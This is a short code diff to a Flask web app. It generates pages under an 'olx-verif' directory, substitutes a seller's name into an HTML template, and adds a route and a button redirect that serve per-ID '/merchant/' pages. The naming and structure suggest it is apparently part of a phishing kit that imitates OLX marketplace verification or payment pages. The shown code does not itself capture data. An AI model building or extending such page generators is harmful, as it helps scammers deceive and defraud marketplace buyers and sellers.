@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template_string, send_from_directory
 import os
 import shutil
 from bs4 import BeautifulSoup
@@ -52,10 +52,21 @@ def save_page(random_id):
         if h3_tag:
             h3_tag.contents[0].replace_with(seller_name_tag)
 
+        button_container = soup.find('div', class_='button-container')
+        if button_container:
+            button = button_container.find('button')
+            if button:
+                button['onclick'] = f"window.location.href='/merchant/{random_id}'"
+
     with open(verif_destination_file, 'w') as file:
         file.write(str(soup))
 
     return jsonify({'message': 'Page saved and files copied successfully'}), 200
+
+@app.route('/merchant/<random_id>')
+def serve_merchant_page(random_id):
+    merchant_path = f"/var/www/olx-verif/merchant/{random_id}"
+    return send_from_directory(merchant_path, 'index.html')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
